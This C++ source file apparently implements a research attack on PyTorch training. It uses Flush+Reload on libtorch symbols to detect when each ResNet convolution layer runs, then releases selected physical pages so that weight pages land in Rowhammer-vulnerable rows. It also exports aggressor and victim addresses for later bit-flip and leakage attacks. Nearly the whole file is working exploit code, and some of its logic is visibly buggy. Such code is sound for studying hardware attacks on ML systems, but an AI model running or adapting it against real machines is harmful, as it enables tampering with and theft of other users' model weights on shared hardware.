#include <iostream>
#include <sys/mman.h>
#include <stdint.h>
#include <inttypes.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/utsname.h>
#include <stdlib.h>
#include <assert.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>  
#include <set>
#include <vector>
#include <bitset>
#include <cmath>
#include <algorithm>
#include <random>
#include <sched.h>
#include <unordered_map>
#include <limits.h>

#include "./utils/rh_util.h"
#include "./utils/dram_sys.h"

extern "C" {
  #include <mastik/fr.h>
  #include <mastik/l1.h>
  #include <mastik/pda.h>
  #include <mastik/util.h>
  #include <mastik/symbol.h>
}

#define SAMPLES 2
#define SLOT	1
#define THRESHOLD 100

using namespace std;


#define OCCUPIED_MEM_SIZE 1 // DRAM size in GB
#define PAGE_TO_RELEASE 10000 // Limit the number of vulnerable pages to release 
#define NUM_LAYERS 21

/*
 * Define the page allocation charateristics of the
 * computational microkernel
 */
// Linear layer 
#define L_BEFORE 12
#define L_BETWEEN_LOOP 3
#define L_BETWEEN 2
#define L_INPUT 8
#define L_WEIGHT 9
#define L_LOOP_COUNT 8
// Conv layer 
#define C_BEFORE 22
#define C_BETWEEN_LOOP 12
#define C_BETWEEN 7
#define C_INPUT 12
#define C_WEIGHT 22
#define C_LOOP_COUNT 7


enum attrs{
    CONV_BEGIN=0,
    CONV_MACRO=1,
    LINEAR_BEGIN=2,
    QCONV_BEIGN=3,
    QCONV_END=4,
    EMIT=5,
};

const char *monitor[] = {
  // Symbol of anchor points to monitor
  "../aten/src/ATen/native/mkldnn/Conv.cpp::87",
  "../third_party/ideep/include/ideep/operators/conv.hpp::428",
  "../aten/src/ATen/native/quantized/cpu/qlinear.cpp:206",
  "../aten/src/ATen/native/quantized/cpu/qconv.cpp:269",
  "../aten/src/ATen/native/quantized/cpu/qconv.cpp:503",
  "_ZN6fbgemm13emitLoadDWordILNS_10inst_set_tE1EN6asmjit3x863YmmELi0EEEvPNS3_7EmitterET0_RKNS3_3MemE", // Workaround for ../third_party/fbgemm/src/./CodeGenHelpers.h:56
};


const char *attr[] = {
  "_mkldnn_convolution->ideep::convolution_forward::compute", // Start new conv layer computation
  "do_prepare->macro", // Conv layer macro kernel
  "PackedLinearWeight::apply_impl->End",
  "PackedConvWeight::apply_impl->Start",
  "PackedConvWeight::apply_impl->End",
  "emitLoadDWord",
};


int nmonitor = sizeof(monitor)/sizeof(monitor[0]);

struct memPointer {
  uint64_t *ptr;
  uint64_t paddr;
  uint64_t profileIdx;
  uint free;
};

struct hammerRow {
  uint64_t *ptr;
  uint64_t paddr;
  uint64_t first;
  uint64_t last;
};

struct rowMaps {
  uint64_t rowIdx;
  uint64_t * ptr;
  uint64_t paddr;

  bool operator<(const rowMaps& rhs) const {
    return rowIdx < rhs.rowIdx;
  }

  bool operator==(const rowMaps& rhs) const {
    return rowIdx == rhs.rowIdx;
  }
};

struct rowhammerLayout {
  bool found;
  uint64_t agg1; // Attack page in first agg row
  uint64_t leakable; // Victim target row to inject bitflip 
  uint64_t agg2; // Attacker controlled second agg row

  uint64_t * agg1_ptr;
  uint64_t * leakable_ptr;
  uint64_t * agg2_ptr;

  bool operator<(const rowhammerLayout& rhs) const {
    return leakable < rhs.leakable;
  }

  bool operator==(const rowhammerLayout& rhs) const {
    return leakable == rhs.leakable;
  }

};

std::vector<std::set<uint64_t>> bitflipProfile; 
std::vector<std::vector<uint64_t>> leakageProfile; 
std::vector<std::set<rowMaps>> dramProfile; 

int prof_size;
uint64_t * filp_profile;

std::vector<memPointer>page_factory;
std::vector<rowhammerLayout>vulnerable_pages;
std::vector<uint64_t *>regular_pages;

int current_vul_ptr = 0;
int current_reg_ptr = 0;

int relocated_pages_idx[NUM_LAYERS];

void filp_profile_reader(const char* filename);
void exhaust_memory();
void batch_page_release(int mode);
void perform_cleanup();
void export_relocated_pages();
void accessPage(uint64_t * mapped, int toPages);
int getTopAggressor(uint64_t paddr);
int getBottomAggressor(uint64_t paddr);
rowhammerLayout leakablePageWithSandwichLayout(uint64_t paddr, uint64_t * ptr);
void l1pp();


int flip_offset[] = {25289,135940,146389,52,136699,88899,26017,3922,77603,25979,6694,36194,17911,272069,35927,6170,2963,6049,36067,14926,147428,7006,29366,29366,5486,55735,95075,129178,3671,440401,227987,13262,28106,29345,142325,21040,12590,92072};
std::string flip_location[] = {"model.layer2.1.conv2.weight", "model.layer2.0.conv2.weight", "model.layer2.1.conv1.weight", "model.layer2.0.conv1.weight", "model.layer2.0.conv2.weight", "model.layer3.0.conv1.weight", "model.layer1.0.conv2.weight", "model.layer1.0.conv1.weight", "model.layer2.1.conv2.weight", "model.layer1.0.conv1.weight", "model.conv1.weight", "model.layer1.0.conv1.weight", "model.layer1.0.conv2.weight", "model.layer3.0.conv1.weight", "model.layer1.1.conv1.weight", "model.layer1.0.conv1.weight", "model.layer1.1.conv2.weight", "model.layer2.0.downsample.0.weight", "model.layer1.0.conv1.weight", "model.layer1.0.conv2.weight", "model.layer2.1.conv1.weight", "model.layer1.1.conv2.weight", "model.layer1.0.conv2.weight", "model.layer1.1.conv2.weight", "model.layer1.1.conv1.weight", "model.layer3.0.conv2.weight", "model.layer3.0.conv1.weight", "model.layer2.0.conv2.weight", "model.layer2.0.downsample.0.weight", "model.layer3.0.conv2.weight", "model.layer3.0.conv1.weight", "model.layer1.0.conv2.weight", "model.layer1.1.conv1.weight", "model.layer1.0.conv2.weight", "model.layer3.0.conv2.weight", "model.layer1.1.conv2.weight", "model.layer2.1.conv1.weight", "model.layer2.1.conv1.weight"};
int flip_iteration[] = {3901,3901,3901,3901,3901,3901,3901,3901,3901,3901,3901,3901,3901,3901,4000,4000,4000,4000,4000,4000,4000,4000,4000,4000,4000,4000,4000,4100,4100,4100,4300,5200,5200,6700,6700,6700,6700,6700};
int total_flips = 38;


int main(int argc, char const *argv[]) {

    char current_path[PATH_MAX];
    if (getcwd(current_path, sizeof(current_path)) == nullptr) {
        perror("getcwd() error");
        return 1;
    }

    std::string currentPath(current_path);
    std::cout << "Please modify 'line 79-83' to correct path: " << currentPath << std::endl;

    // Check if there are sufficient arguments
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <binary_path> <flipprofile_path>" << std::endl;
        return 1;
    }

    // Assign command-line arguments to variables
    std::string binary_path = argv[1];  // Binary path (e.g., <path_to_libtorch_cpu.so>)
    std::string flipprofile_path = argv[2];  // Flip profile path (e.g., <path_to_bitflip_profile>)

  signal (SIGINT, force_exit);

  init_dram_config(1); // Set number of DIMMS to 1

  filp_profile_reader(flipprofile_path.c_str()); // read trace file and get leakage profile

  int starting_offsets[17] = {} ;

#ifdef USEPP
  for (int i = 0; i < 17; i++) {
    starting_offsets[i] = probe_all();
  }
#endif


    std::unordered_map<int, std::string> dict;
    dict[1] = "model.conv1.weight";
    dict[2] = "model.layer1.0.conv1.weight";
    dict[3] = "model.layer1.0.conv2.weight";
    dict[4] = "model.layer1.1.conv1.weight";
    dict[5] = "model.layer1.1.conv2.weight";
    dict[6] = "model.layer2.0.conv1.weight";
    dict[7] = "model.layer2.0.conv2.weight";
    dict[8] = "skip1";
    dict[9] = "model.layer2.1.conv1.weight";
    dict[10] = "model.layer2.1.conv2.weight";
    dict[11] = "model.layer3.0.conv1.weight";
    dict[12] = "model.layer3.0.conv2.weight";
    dict[13] = "skip2"; 
    dict[14] = "model.layer3.1.conv1.weight";
    dict[15] = "model.layer3.1.conv2.weight";
    dict[16] = "model.layer4.0.conv1.weight";
    dict[17] = "model.layer4.0.conv2.weight";
    dict[18] = "skip3"; 
    dict[19] = "model.layer4.1.conv1.weight";
    dict[20] = "model.layer4.1.conv2.weight";

  while (1) {
    // exhaust_memory();
    // Setup F+R
    fr_t fr = fr_prepare();
    printf("[INFO] Setting F+R anchor points\n");
    for (int i = 0; i < nmonitor; i++) {
      uint64_t offset = sym_getsymboloffset(binary_path.c_str(), monitor[i]);
      if (offset == ~0ULL) {
        fprintf(stderr, "Cannot find %s in %s\n", monitor[i], binary_path.c_str());
        exit(1);
      } 
      printf("[INFO] Anchor at: 0x%lx [%s]\n", offset, attr[i]);
      fr_monitor(fr, map_offset(binary_path.c_str(), offset));
    }

    uint16_t *res = (uint16_t *)malloc(SAMPLES * nmonitor * sizeof(uint16_t));
    for (int i = 0; i < SAMPLES * nmonitor ; i+= 4096/sizeof(uint16_t))
      res[i] = 1;
    fr_probe(fr, res);
    printf("[INFO] Anchors setup successfully\n");
    printf("[INFO] Monitoring anchors...\n");

    int mode = 0; // 1-> linear; 2-> conv
    int lines = 0;
    int conv = 0;
    int lin = 0;
    int cur_layer = 0;
    int cur_iter = 0;
    
    int cur_conv_layer = 0;
    for (;;) {
      fr_probe(fr, res);
      if (res[CONV_BEGIN] < THRESHOLD) {
        // This starts the computation of CONV layer
        printf("[INFO] Conv layer detected.\n");
        cur_conv_layer++;
        if (cur_conv_layer > 21) {
          cur_conv_layer = 1;
          cur_iter++;
        }
        relocated_pages_idx[cur_conv_layer] = current_vul_ptr;
      }

      bool foundIter = false;
      for (int i = 0; i < sizeof(flip_iteration) / sizeof(flip_iteration[0]); ++i) {
          if (flip_iteration[i] == cur_iter) {
              foundIter = true;
              break; 
          }
      }

      if (foundIter) {
        // Get the value from the dictionary
        std::string value = dict[cur_conv_layer];

        bool foundLayer = false;
        std::vector<int> corresponding_offsets;

        for (int i = 0; i < sizeof(flip_location)/sizeof(flip_location[0]); ++i) {
          if (flip_location[i] == value) {
              corresponding_offsets.push_back(flip_offset[i]);
              foundLayer = true;
          }
        }

        if (foundLayer) {
          if (cur_conv_layer != 8 && cur_conv_layer != 13 && cur_conv_layer != 18) {
              mode = 2;
            if (res[CONV_MACRO] < THRESHOLD) {
              batch_page_release(mode); // TODO: Modify the vulnerable_pages as a vulnerable off
              lines++;
            }
          }
        }
      }
    }
    free(res);
    fr_release(fr);

    // We now export the weight pages corresponding to each layer
    // A output.dat is generated which contains individual layer number
    // and corresponding weight page frame numbers
    export_relocated_pages();
    perform_cleanup();
  }

  return 0;
}

void filp_profile_reader(const char* filename) {
  /*
   * This function reads the bitflip profile file and
   * populates the filp_profile array 
   * Note, the input is bitflip profile, generated
   * output is "leakable row" profile (i.e., top or bottom
   * aggressor of flippable page) 
   */
  // Initiate the flip_profile
  FILE * fp;
  char * line = NULL;
  size_t len = 0;
  ssize_t read;

  bitflipProfile.resize(32);
  leakageProfile.resize(32);
  dramProfile.resize(32);

  fp = fopen(filename, "r");
  if (fp == NULL)
    exit(EXIT_FAILURE);
  
  long int lines =0;
  while (EOF != (fscanf(fp, "%*[^\n]"), fscanf(fp,"%*c")))
    ++lines;
  prof_size = lines;
  filp_profile = (uint64_t*)malloc(prof_size * sizeof(uint64_t));

  for (size_t i = 0; i < prof_size; i++) {
    filp_profile[i] = 0;
  }
  fclose(fp);
  
  fp = fopen(filename, "r");
  if (fp == NULL)
    exit(EXIT_FAILURE);
  
  int hash_idx = 0;
  printf("[INFO] Reading bitflip profile\n");
  while ((read = getline(&line, &len, fp)) != -1) {
    if (line[0] == '0') {
      int gotPFN = 0;
      char * pfn;
      char * pch = strtok (line," ");
      while (pch != NULL) {
        if (gotPFN == 0) {
          gotPFN = 1;
          pfn = pch;
          break; // Already got PFN from this line
        }
      }
      uint64_t pfn_int = (uint64_t)strtol(pfn, NULL, 16);
      uint64_t topAgg = getTopAggressor((uint64_t)pfn_int);
      uint64_t bottomAgg = getBottomAggressor((uint64_t)pfn_int);
      uint64_t hash_val = get_dram_mapping((void *)pfn_int);
      if (topAgg != 0) leakageProfile[hash_val].push_back(topAgg);
      if (bottomAgg != 0) leakageProfile[hash_val].push_back(bottomAgg);
      bitflipProfile[hash_val].insert((uint64_t)pfn_int);
      // filp_profile[hash_idx++] = pfn_int;
    }
  }

  fclose(fp);
  if (line)
      free(line);
}

void showProgress(float progress) {
  /*
   * Progress bar
   * https://stackoverflow.com/questions/14539867/how-to-display-a-progress-indicator-in-pure-c-c-cout-printf
   */

  int barWidth = 70;
  std::cout << "[";
  int pos = barWidth * progress;
  for (int i = 0; i < barWidth; ++i) {
      if (i < pos) std::cout << "=";
      else if (i == pos) std::cout << ">";
      else std::cout << " ";
  }
  std::cout << "] " << int(progress * 100.0) << " %\r";
  std::cout.flush();
}

void exhaust_memory() {
  // This funcitoon exhuast the memoery by occupying <OCCUPIED_MEM_SIZE>GB 
  // and populates vulnerable_pages with <PAGE_TO_RELEASE> entries
  printf("[INFO] Exhausting memory...\n");
  uint64_t fullExhaust = GetPhysicalMemorySize() / 4096;
  uint64_t * temp = (uint64_t *)(mmap(NULL, fullExhaust*4096, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, 0, 0));
  // for (int i = 0; i < fullExhaust*4096 ; i+= 4096/sizeof(uint64_t)) {
  //   temp[i] &= 0;
  // }
  munmap(temp, fullExhaust*4096);

  uint64_t numPages = (OCCUPIED_MEM_SIZE * 1024 * 1024) / 4;
  page_factory.resize(numPages);
  // page_factory = (memPointer *)malloc(numPages * sizeof(struct memPointer));

  int vul_idx = 0;
  int reg_idx = 0;
  float progress = 0.0;
  for (size_t i = 0; i < numPages; i++) {
    progress = (float)i/numPages;
    showProgress(progress);
    page_factory[i].ptr = (uint64_t *)(mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, 0, 0));
    /* Note: in this example, we use pagemap to obtain the physical address of 
     * the pages, which may need root privilege for demonstration
    */
    page_factory[i].paddr = get_pa((uint64_t *)page_factory[i].ptr);

    size_t hash_idx = get_dram_mapping((void *)page_factory[i].paddr);
    rowMaps new_row = {page_factory[i].paddr/get_row_size(), page_factory[i].ptr, page_factory[i].paddr};
    dramProfile[hash_idx].insert(new_row);
  }
  printf("\n");

  // Shuffle the page factory to get new pages every round
  auto rng = std::default_random_engine {};
  std::shuffle(std::begin(page_factory), std::end(page_factory), rng);


  printf("[INFO] Preparing leakable pages for releasing...\n");
  for (size_t i = 0; i < numPages; i++) {
    progress = (float)i/numPages;
    showProgress(progress);

    size_t hash_idx = get_dram_mapping((void *)page_factory[i].paddr);
    if (!(std::find(leakageProfile[hash_idx].begin(), leakageProfile[hash_idx].end(), page_factory[i].paddr) != leakageProfile[hash_idx].end())) {
      regular_pages.push_back((uint64_t *)page_factory[i].ptr);
      continue;
    }

    bool vul_page = false;
    rowhammerLayout newLayout = leakablePageWithSandwichLayout(page_factory[i].paddr, page_factory[i].ptr);
    if (newLayout.found == true) {
      if (vulnerable_pages.size() < PAGE_TO_RELEASE) {
        vul_page = true;
        vulnerable_pages.push_back(newLayout);
      }
    }
    if (!vul_page) {
      regular_pages.push_back((uint64_t *)page_factory[i].ptr);
    }
    if ((vulnerable_pages.size() >= PAGE_TO_RELEASE) && (regular_pages.size() >= 10*PAGE_TO_RELEASE)) break;
  }
  printf("\n");

  //   size_t hash_idx = get_dram_mapping((void *)page_factory[i].paddr);
  //   hammerRow newRow = {(uint64_t *)page_factory[i].ptr, page_factory[i].paddr, 0, 0};
  //   dramProfile[hash_idx].push_back(newRow);

  //   bool found = 0;
  //   if (vul_idx < PAGE_TO_RELEASE) {
  //     found = bitflipProfile[hash_idx].find(page_factory[i].paddr) != bitflipProfile[hash_idx].end();
  //   }
  //   if ((found == 1) && (vulnerable_pages.size() < PAGE_TO_RELEASE)) {
  //     // vulnerable_pages[vul_idx++] = page_factory[i].ptr;
  //     page_factory[i].free = 1;
  //     vulnerable_pages.insert((uint64_t)page_factory[i].ptr);
  //   } else if (regular_pages.size() < 10*PAGE_TO_RELEASE) {
  //     page_factory[i].free = 0;
  //     regular_pages.insert((uint64_t)page_factory[i].ptr);
  //     // regular_pages[reg_idx++] = page_factory[i].ptr;
  //   } else {
  //     page_factory[i].free = 1;
  //   }

  //   if ((vulnerable_pages.size() >= PAGE_TO_RELEASE) && (regular_pages.size() >= 10*PAGE_TO_RELEASE)) break;
  // }

  if ((vulnerable_pages.size() < PAGE_TO_RELEASE) || (regular_pages.size() < 10*PAGE_TO_RELEASE)) {
    printf("[WARN] Could not get enough vulnerable and/or regular pages.\n[WARN] May lead to unexpected behavior.\n");
  }
  printf("[INFO] Found %lu leakable pages and %lu regular pages\n",vulnerable_pages.size(), regular_pages.size());

}

void batch_page_release(int mode) {
  // mode = 1->  linear layer
  // mode = 2->  conv layer
  int before, betweenLoop, between, perRegular, perWeight, loopCount;
  if (mode == 1) {
    before = L_BEFORE;
    betweenLoop = L_BETWEEN_LOOP;
    between = L_BETWEEN;

    perRegular = L_INPUT;
    perWeight = L_WEIGHT;

    loopCount = L_LOOP_COUNT;
  } else if (mode == 2) {
    before = C_BEFORE;
    betweenLoop = C_BETWEEN_LOOP;
    between = C_BETWEEN;

    perRegular = C_INPUT;
    perWeight = C_WEIGHT;

    loopCount = C_LOOP_COUNT;
  } else {
    printf("[ERROR] Wrong layer type\n");
    exit(EXIT_FAILURE);
  }

  printf("[INFO] Releasing batch pages\n");
  for (size_t i = 0; i < loopCount; i++) {
    for (size_t j = 0; j < perWeight; j++) {
      assert(vulnerable_pages[current_vul_ptr++].found);
      munmap(vulnerable_pages[current_vul_ptr].agg1_ptr, 4096);
    }
    for (size_t j = 0; j < between; j++) {
      munmap(regular_pages[current_reg_ptr++], 4096);
    }
    for (size_t j = 0; j < perRegular; j++) {
      munmap(regular_pages[current_reg_ptr++], 4096);
    }
    for (size_t j = 0; j < betweenLoop; j++) {
      munmap(regular_pages[current_reg_ptr++], 4096);
    }
  }
  for (size_t j = 0; j < before; j++) {
    munmap(regular_pages[current_reg_ptr++], 4096);
  }

  sched_yield();  
}

void perform_cleanup() {
  current_vul_ptr = 0;
  current_reg_ptr = 0;

  uint64_t numPages = (OCCUPIED_MEM_SIZE * 1024 * 1024) / 4;
  for (size_t i = 0; i < numPages; i++) {
    if (page_factory[i].free == 0) {
      munmap(page_factory[i].ptr, 4096);
    } 
  }

  page_factory.clear();
  vulnerable_pages.clear();
  regular_pages.clear();
  // memset(vulnerable_pages, 0, PAGE_TO_RELEASE);
  // memset(regular_pages, 0, 10*PAGE_TO_RELEASE);

  // Shift bitflip profile so that next round different vulnerable page is choosen
  // uint64_t last_element = filp_profile[prof_size - 1];
  // for (size_t i = prof_size - 2; i > 0; i--) {
  //   filp_profile[i+1] = filp_profile[i];
  // }
  // filp_profile[0] = last_element;
}

void export_relocated_pages() {
  FILE *f = fopen("output.dat", "w");
  if (f == NULL) {
    printf("Error opening file!\n");
    exit(1);
  }

  int init_idx = 0;
  int last_idx = 0;
  fprintf(f, "# Layer no., Weight page no. in layer, agg1_paddr, target_padder (contains victim page), agg2_padder");
  for (size_t i = 0; i < NUM_LAYERS; i++) {
    fprintf(f, "%ld\t", i+1);
    if (i == 0) {
      init_idx = 0;
      last_idx = relocated_pages_idx[i];
    } else {
      init_idx = relocated_pages_idx[i - 1];
      last_idx = relocated_pages_idx[i];
    }

    int idx = 0;
    for (size_t j = init_idx; j < last_idx; j++) {
      fprintf(f, "%d \t %lx \t %lx \t %lx\n", idx++, (uint64_t)vulnerable_pages[j].agg1, (uint64_t)vulnerable_pages[j].leakable, (uint64_t)vulnerable_pages[j].agg2);
    }
  }

  /* Use this output.dat file to get the PFN corresponding 
   * to the weight pages in each layer.
   * The perform the rowhammer-based leakage attacks 
   * on these rows to leak bits from these pages
   */

  fclose(f);
}

int getTopAggressor(uint64_t paddr) {
  // int row_size = get_row_size();
  // int shifter = (int)log2(row_size);

  // paddr = paddr >> shifter;
  // paddr = paddr + 1;
  // if (paddr < 0) return 0;
  // paddr = paddr << shifter;

  int hash_idx = get_dram_mapping((void *)paddr);
  int row_idx = paddr/get_row_size();

  bool found = false;

  while (!found) {
    paddr = paddr - 0x1000;
    if ((int)paddr < 0) {
      return 0;
    }
    int new_row_idx = paddr/get_row_size();
    if (new_row_idx == (row_idx - 1)) {
      int new_hash_idx = get_dram_mapping((void *)paddr);
      if (new_hash_idx == hash_idx) {
        found = true;
      }
    }
  }

  if (!found) {
    return 0;
  }

  return paddr;
}


int getBottomAggressor(uint64_t paddr) {
  // int row_size = get_row_size();
  // int shifter = (int)log2(row_size);

  // paddr = paddr >> shifter;
  // paddr = paddr - 1;
  // if (paddr < 0) return 0;
  // paddr = paddr << shifter;

  // return paddr;

  int hash_idx = get_dram_mapping((void *)paddr);
  int row_idx = paddr/get_row_size();

  bool found = false;

  while (!found) {
    paddr = paddr + 0x1000;
    if ((int)paddr < 0) {
      return 0;
    }
    int new_row_idx = paddr/get_row_size();
    if (new_row_idx == (row_idx + 1)) {
      int new_hash_idx = get_dram_mapping((void *)paddr);
      if (new_hash_idx == hash_idx) {
        found = true;
      }
    }
  }

  if (!found) {
    return 0;
  }

  return paddr;
}


rowhammerLayout leakablePageWithSandwichLayout(uint64_t paddr, uint64_t * ptr) {
  int hash_idx = get_dram_mapping((void *)paddr);
  uint64_t row_idx = paddr/get_row_size();
  uint64_t topAggLayout[] = {(row_idx + 1), (row_idx + 2)}; // This row is top agg
  uint64_t bottomAggLayout[] = {(row_idx - 1), (row_idx - 2)}; // This row is bottom agg

  bool finished = false;
  uint64_t target_paddr;
  uint64_t attacker_paddr;
  uint64_t victim_paddr = paddr;

  uint64_t * target_ptr;
  uint64_t * attacker_ptr;
  uint64_t * victim_ptr = ptr;

  if (!finished) {
    if ((topAggLayout[0] >= 0) && (topAggLayout[1] >= 0)) {
      // Top agg layout potentially possible for this row
      // find if we have the correct layout 
      rowMaps first_row_to_find = {topAggLayout[0], 0, 0};
      if (dramProfile[hash_idx].find(first_row_to_find) != dramProfile[hash_idx].end()) {
        rowMaps second_row_to_find = {topAggLayout[1], 0, 0};
        if (dramProfile[hash_idx].find(second_row_to_find) != dramProfile[hash_idx].end()) {
          // Found both rows
          bool found = false;
          for (auto &p: dramProfile[hash_idx]) {
            if (p.rowIdx == topAggLayout[0]) {
              target_paddr = p.paddr;
              target_ptr = p.ptr;
              found = true;
              break;
            }
          }
          assert(found);
          found = false;
          for (auto &p: dramProfile[hash_idx]) {
            if (p.rowIdx == topAggLayout[1]) {
              attacker_paddr = p.paddr;
              attacker_ptr = p.ptr;
              found = true;
              break;
            }
          }
          assert(found);
          finished = true;
        }
      }
    }
  }

  if (!finished) {
    if ((bottomAggLayout[0] >= 0) && (bottomAggLayout[1] >= 0)) {
      // Bottom agg layout potentially possible for this row
      // find if we have the correct layout 
      rowMaps first_row_to_find = {bottomAggLayout[0], 0, 0};
      if (dramProfile[hash_idx].find(first_row_to_find) != dramProfile[hash_idx].end()) {
        rowMaps second_row_to_find = {bottomAggLayout[1], 0, 0};
        if (dramProfile[hash_idx].find(second_row_to_find) != dramProfile[hash_idx].end()) {
          // Found both rows
          bool found = false;
          for (auto &p: dramProfile[hash_idx]) {
            if (p.rowIdx == bottomAggLayout[0]) {
              target_paddr = p.paddr;
              target_ptr = p.ptr;
              found = true;
              break;
            }
          }
          assert(found);
          found = false;
          for (auto &p: dramProfile[hash_idx]) {
            if (p.rowIdx == bottomAggLayout[1]) {
              attacker_paddr = p.paddr;
              attacker_ptr = p.ptr;
              found = true;
              break;
            }
          }
          assert(found);
          finished = true;
        }
      }
    }
  }

  rowhammerLayout layout = {finished, target_paddr, victim_paddr, attacker_paddr, victim_ptr, target_ptr, attacker_ptr};
  

  return layout;
}


